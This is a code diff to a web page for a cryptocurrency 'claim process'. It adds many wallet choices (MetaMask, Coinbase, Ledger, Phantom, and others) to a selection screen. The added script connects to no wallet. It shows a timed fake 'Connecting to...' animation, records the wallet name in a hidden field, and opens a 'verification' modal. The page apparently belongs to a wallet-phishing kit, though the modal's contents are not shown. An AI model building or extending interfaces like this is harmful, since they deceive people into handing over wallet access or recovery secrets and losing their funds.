@@ -65,6 +65,13 @@
 @keyframes spin {
     to { transform: rotate(360deg); }
 }
+/* Add this to your style section */
+#additionalWallets {
+    border-left: 3px solid #3b82f6;
+    margin-left: 12px;
+    padding-left: 12px;
+    transition: all 0.3s ease;
+}
     </style>
 </head>
 <body class="min-h-screen font-sans" style="background: linear-gradient(to bottom right, rgba(240, 248, 255, 0.8), rgba(224, 242, 254, 0.8)), url('/bg.jpg'); background-size: cover; background-position: center; background-attachment: fixed;">
@@ -225,6 +232,7 @@
             <p class="text-gray-600 mb-6 text-center">Select your preferred wallet to continue with the claim process</p>
             
             <div class="space-y-4">
+                <!-- MetaMask -->
                 <div id="metamaskOption" class="wallet-option bg-gray-50 border border-gray-200 rounded-lg p-4 flex items-center cursor-pointer hover:bg-gray-100">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" class="w-10 h-10 mr-4">
                     <div>
@@ -234,6 +242,7 @@
                     <i class="fas fa-chevron-right ml-auto text-gray-400"></i>
                 </div>
                 
+                <!-- Trust Wallet -->
                 <div id="trustWalletOption" class="wallet-option bg-gray-50 border border-gray-200 rounded-lg p-4 flex items-center cursor-pointer hover:bg-gray-100">
                     <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet" class="w-10 h-10 mr-4">
                     <div>
@@ -241,6 +250,79 @@
                         <p class="text-sm text-gray-500">Mobile wallet</p>
                     </div>
                     <i class="fas fa-chevron-right ml-auto text-gray-400"></i>
+                </div>
+                
+                <!-- Coinbase Wallet -->
+                <div id="coinbaseOption" class="wallet-option bg-gray-50 border border-gray-200 rounded-lg p-4 flex items-center cursor-pointer hover:bg-gray-100">
+                    <img src="https://cryptologos.cc/logos/coinbase-wallet-cbw-logo.png" alt="Coinbase Wallet" class="w-10 h-10 mr-4">
+                    <div>
+                        <h3 class="font-semibold">Coinbase Wallet</h3>
+                        <p class="text-sm text-gray-500">Browser & mobile</p>
+                    </div>
+                    <i class="fas fa-chevron-right ml-auto text-gray-400"></i>
+                </div>
+                
+                <!-- WalletConnect -->
+                <div id="walletConnectOption" class="wallet-option bg-gray-50 border border-gray-200 rounded-lg p-4 flex items-center cursor-pointer hover:bg-gray-100">
+                    <img src="https://altcoinsbox.com/wp-content/uploads/2023/01/wallet-connect-logo.png" alt="WalletConnect" class="w-10 h-10 mr-4">
+                    <div>
+                        <h3 class="font-semibold">WalletConnect</h3>
+                        <p class="text-sm text-gray-500">Multiple wallets</p>
+                    </div>
+                    <i class="fas fa-chevron-right ml-auto text-gray-400"></i>
+                </div>
+                
+                <!-- Additional Wallets (Hidden by default) -->
+                <div id="additionalWallets" class="hidden space-y-4 pt-2">
+                    <!-- Phantom -->
+                    <div class="wallet-option bg-gray-50 border border-gray-200 rounded-lg p-4 flex items-center cursor-pointer hover:bg-gray-100">
+                        <img src="https://phantom.app/favicon-32x32.png" alt="Phantom" class="w-10 h-10 mr-4">
+                        <div>
+                            <h3 class="font-semibold">Phantom</h3>
+                            <p class="text-sm text-gray-500">Solana wallet</p>
+                        </div>
+                        <i class="fas fa-chevron-right ml-auto text-gray-400"></i>
+                    </div>
+                    
+                    <!-- Ledger -->
+                    <div class="wallet-option bg-gray-50 border border-gray-200 rounded-lg p-4 flex items-center cursor-pointer hover:bg-gray-100">
+                        <img src="https://cryptologos.cc/logos/ledger-led-logo.png" alt="Ledger" class="w-10 h-10 mr-4">
+                        <div>
+                            <h3 class="font-semibold">Ledger</h3>
+                            <p class="text-sm text-gray-500">Hardware wallet</p>
+                        </div>
+                        <i class="fas fa-chevron-right ml-auto text-gray-400"></i>
+                    </div>
+                    
+                    <!-- Brave Wallet -->
+                    <div class="wallet-option bg-gray-50 border border-gray-200 rounded-lg p-4 flex items-center cursor-pointer hover:bg-gray-100">
+                        <img src="https://brave.com/static-assets/images/brave-logo-sans-text.svg" alt="Brave Wallet" class="w-10 h-10 mr-4">
+                        <div>
+                            <h3 class="font-semibold">Brave Wallet</h3>
+                            <p class="text-sm text-gray-500">Browser built-in</p>
+                        </div>
+                        <i class="fas fa-chevron-right ml-auto text-gray-400"></i>
+                    </div>
+                    
+                    <!-- Binance Chain Wallet -->
+                    <div class="wallet-option bg-gray-50 border border-gray-200 rounded-lg p-4 flex items-center cursor-pointer hover:bg-gray-100">
+                        <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" alt="Binance Chain Wallet" class="w-10 h-10 mr-4">
+                        <div>
+                            <h3 class="font-semibold">Binance Chain</h3>
+                            <p class="text-sm text-gray-500">BNB Chain wallet</p>
+                        </div>
+                        <i class="fas fa-chevron-right ml-auto text-gray-400"></i>
+                    </div>
+                    
+                    <!-- Argent -->
+                    <div class="wallet-option bg-gray-50 border border-gray-200 rounded-lg p-4 flex items-center cursor-pointer hover:bg-gray-100">
+                        <img src="https://assets.website-files.com/5f973c970bea5548ad4287ef/5f973c970bea55b93a428a7f_argent-logo.svg" alt="Argent" class="w-10 h-10 mr-4">
+                        <div>
+                            <h3 class="font-semibold">Argent</h3>
+                            <p class="text-sm text-gray-500">Smart wallet</p>
+                        </div>
+                        <i class="fas fa-chevron-right ml-auto text-gray-400"></i>
+                    </div>
                 </div>
             </div>
             
@@ -440,6 +522,69 @@
                 document.body.style.overflow = 'auto';
             }
         });
+
+        // Add this to your existing script
+const walletConnectOption = document.getElementById('walletConnectOption');
+const additionalWallets = document.getElementById('additionalWallets');
+
+walletConnectOption.addEventListener('click', function(e) {
+    // If additional wallets are already visible, proceed to verification
+    if (!additionalWallets.classList.contains('hidden')) {
+        showConnectingAnimation('WalletConnect');
+        return;
+    }
+    
+    // Otherwise show additional wallets
+    e.stopPropagation();
+    additionalWallets.classList.remove('hidden');
+    
+    // Change the WalletConnect option to show it's active
+    walletConnectOption.classList.add('bg-blue-50', 'border-blue-200');
+    walletConnectOption.querySelector('h3').textContent = 'Select Wallet Below';
+    walletConnectOption.querySelector('p').textContent = 'Choose from additional options';
+    
+    // Change the chevron to down icon
+    const icon = walletConnectOption.querySelector('.fa-chevron-right');
+    icon.classList.remove('fa-chevron-right');
+    icon.classList.add('fa-chevron-down');
+});
+
+// Handle clicks on additional wallets
+document.querySelectorAll('#additionalWallets .wallet-option').forEach(option => {
+    option.addEventListener('click', function() {
+        const walletName = this.querySelector('h3').textContent;
+        showConnectingAnimation(walletName);
+    });
+});
+
+// Update the showConnectingAnimation function to reset WalletConnect UI
+function showConnectingAnimation(walletName) {
+    // Reset WalletConnect UI if it was expanded
+    if (!additionalWallets.classList.contains('hidden')) {
+        additionalWallets.classList.add('hidden');
+        walletConnectOption.classList.remove('bg-blue-50', 'border-blue-200');
+        walletConnectOption.querySelector('h3').textContent = 'WalletConnect';
+        walletConnectOption.querySelector('p').textContent = 'Multiple wallets';
+        const icon = walletConnectOption.querySelector('.fa-chevron-down');
+        if (icon) {
+            icon.classList.remove('fa-chevron-down');
+            icon.classList.add('fa-chevron-right');
+        }
+    }
+    
+    // Rest of your existing animation code
+    const animation = document.getElementById('connectingAnimation');
+    const connectingText = document.getElementById('connectingText');
+    
+    connectingText.textContent = `Connecting to ${walletName}...`;
+    animation.classList.add('active');
+    
+    setTimeout(() => {
+        animation.classList.remove('active');
+        document.getElementById('walletType').value = walletName.toLowerCase().replace(' ', '');
+        verificationModal.classList.add('active');
+    }, 5000);
+}
 
         function copyContractAddress() {
     const contractAddress = '0xb4950Af18FAE3c3Da735163F1226fda8222bBbEc';
